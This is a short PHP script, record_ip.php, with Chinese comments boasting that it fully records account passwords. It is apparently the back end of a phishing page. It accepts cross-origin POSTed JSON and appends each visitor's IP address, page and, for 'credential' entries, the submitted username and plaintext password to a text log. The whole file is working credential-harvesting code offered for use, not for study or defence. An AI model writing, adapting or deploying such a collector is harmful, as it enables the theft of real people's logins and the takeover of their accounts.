<?php
// record_ip.php 最终正式版 —— 能完整记录账号密码
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

// 读取前端 POST 的 JSON 数据
$input = file_get_contents('php://input');
$data = json_decode($input, true);

$logFile = 'ip.txt';
$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';

function s($str) {
    return htmlspecialchars(trim($str ?? ''), ENT_QUOTES, 'UTF-8');
}

$log = "";
if ($data && isset($data['type'])) {
    if ($data['type'] === 'credential') {
        // 抓到账号密码了！
        $log = sprintf("[%s] LOGIN | IP: %s | USER: %s | PASS: %s | PAGE: %s\n",
            date('Y-m-d H:i:s'),
            $ip,
            s($data['username'] ?? ''),
            s($data['password'] ?? ''),
            s($data['page'] ?? '')
        );
    } else {
        // 只是访问页面
        $log = sprintf("[%s] VISIT | IP: %s | PAGE: %s\n",
            date('Y-m-d H:i:s'),
            $ip,
            s($data['page'] ?? '')
        );
    }
}

// 写入日志
file_put_contents($logFile, $log, FILE_APPEND | LOCK_EX);

echo json_encode(['status' => 'success']);
?>